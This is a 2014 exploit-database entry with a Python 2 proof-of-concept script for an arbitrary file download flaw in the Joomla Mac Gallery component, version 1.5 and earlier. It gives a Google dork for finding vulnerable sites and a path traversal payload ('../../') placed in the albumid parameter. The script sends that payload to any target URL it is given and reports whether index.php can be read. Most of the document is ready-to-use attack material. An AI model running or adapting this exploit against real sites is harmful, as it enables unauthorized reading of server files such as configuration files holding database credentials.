######################

# Exploit Title : Joomla Mac Gallery <= 1.5 Arbitrary File Download

# Exploit Author : Claudio Viviani

# Vendor Homepage : https://www.apptha.com

# Software Link : https://www.apptha.com/downloadable/download/sample/sample_id/18

# Dork Google: inurl:option=com_macgallery

# Date : 2014-09-17

# Tested on : Windows 7 / Mozilla Firefox

#             Linux / Mozilla Firefox

# Info:

# Joomla Mac Gallery suffers from Arbitrary File Download vulnerability

# PoC Exploit:

#http://localhost/index.php?option=com_macgallery&view=download&albumid=[../../filename]

#"album_id" variable is not sanitized.

######################

#!/usr/bin/env python

# http connection
import urllib, urllib2
# Args management
import optparse
# Error managemen
import sys

banner = """
   __                      __           ___ ___
  |__.-----.-----.--------|  .---.-.   |   Y   .---.-.----.
  |  |  _  |  _  |        |  |  _  |   |.      |  _  |  __|
  |  |_____|_____|__|__|__|__|___._|   |. \_/  |___._|____|
 |___|                                 |:  |   |
                                       |::.|:. |
                                       `--- ---'
  _______       __ __                      _____    _______
 |   _   .---.-|  |  .-----.----.--.--.   | _   |  |   _   |
 |.  |___|  _  |  |  |  -__|   _|  |  |   |.|   |__|   1___|
 |.  |   |___._|__|__|_____|__| |___  |   `-|.  |__|____   |
 |:  1   |                      |_____|     |:  |  |:  1   |
 |::.. . |                                  |::.|  |::.. . |
 `-------'                                  `---'  `-------'

                            j00ml4 M4c G4ll3ry <= 1.5 4rb1tr4ry F1l3 D0wnl04d

                        Written by:

                      Claudio Viviani

                   http://www.homelab.it

                      info@homelab.it
                  homelabit@protonmail.ch

             https://www.facebook.com/homelabit
                https://twitter.com/homelabit
             https://plus.google.com/+HomelabIt1/
   https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    else:
        return url

def connection(url,pathtrav):
    try:
        response = urllib2.urlopen(url+'/index.php?option=com_macgallery&view=download&albumid='+pathtrav+'index.php')
        content = response.read()
        if content != "":
            print '[!] VULNERABLE'
            print '[+] '+url+'/index.php?option=com_macgallery&view=download&albumid='+pathtrav+'index.php'
        else:
            print '[X] Not Vulnerable'
    except urllib2.HTTPError:
        print '[X] HTTP Error'
    except urllib2.URLError:
        print '[X] Connection Error'

commandList = optparse.OptionParser('usage: %prog -t URL')
commandList.add_option('-t', '--target', action="store",
                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                  )
options, remainder = commandList.parse_args()

# Check args
if not options.target:
    print(banner)
    commandList.print_help()
    sys.exit(1)

print(banner)

url = checkurl(options.target)
pathtrav = "../../"

connection(url,pathtrav)
